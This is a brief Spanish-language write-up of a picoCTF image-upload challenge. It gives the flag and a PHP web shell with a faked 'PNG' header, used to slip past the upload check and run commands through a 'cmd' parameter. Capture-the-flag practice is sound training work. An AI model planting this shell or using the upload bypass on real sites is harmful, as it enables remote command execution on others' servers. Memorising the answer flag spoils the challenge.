## Descripción:
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:62676/)!

Hints:
None
## Solución:
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
```

## Notas:
Subí un archivo .php
```
PNG
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```
que al inicio contiene PHP al principio para que tenga la firma que es un archivo png y se pueda subir y ejecutar

Seguí su tutorial en YT para que tenga más visitas